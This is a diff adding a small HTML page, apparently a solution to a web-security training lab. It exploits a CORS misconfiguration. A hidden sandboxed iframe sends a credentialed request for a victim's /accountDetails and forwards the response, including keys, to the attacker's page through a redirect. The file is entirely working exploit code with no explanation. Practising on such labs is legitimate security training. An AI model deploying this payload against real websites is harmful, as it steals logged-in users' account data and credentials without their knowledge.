@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport">
+    <title>Document Title</title>
+</head>
+<body>
+    <iframe style="display:none;"
+        sandbox="allow-forms allow-scripts allow-top-navigation" 
+        srcdoc="
+        <script>
+            const request = new XMLHttpRequest();
+            var url = 'https://0a9f002403627eaa805a62db009c0038.web-security-academy.net';
+
+            request.open('GET', url + '/accountDetails', true);
+            request.onload = () => {
+                window.location.href = '/popo?key=' + request.responseText;
+            }
+            request.withCredentials = true; 
+            request.send();
+        </script>"
+    ></iframe>
+</body>
+</html>
